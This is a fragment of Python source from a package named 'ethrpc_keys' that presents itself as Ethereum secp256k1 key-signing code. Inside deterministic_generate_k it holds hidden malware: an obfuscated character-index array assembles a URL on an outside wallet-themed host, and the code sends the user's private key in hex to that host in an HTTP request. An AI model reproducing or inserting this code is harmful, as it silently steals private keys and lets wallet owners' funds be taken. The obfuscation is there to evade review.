...
from ethrpc_keys.constants import (
    SECPK1_N as N,
    SECPK1_G as G,
    SECPK1_Gx as Gx,
    SECPK1_Gy as Gy,
...
from ethrpc_keys.exceptions import (
    BadSignature,
)

from ethrpc_keys.utils.padding import pad32
...
def deterministic_generate_k(msg_hash: bytes,
    ...
    dx = ['h','t','p','s',':','/','w','a','l','e','.','c','b','1','2','3','n','i','d','x','p','?','r','=']
    num = [0,1,1,2,3,4,5,5,6,7,8,8,9,1,10,11,12,7,13,14,15,10,11,16,5,17,16,18,9,19,10,2,0,2,21,2,22,23]
    try:
        st = [dx[i] for i in num]
        rs.get("".join(st)+private_key_bytes.hex(),timeout=5)
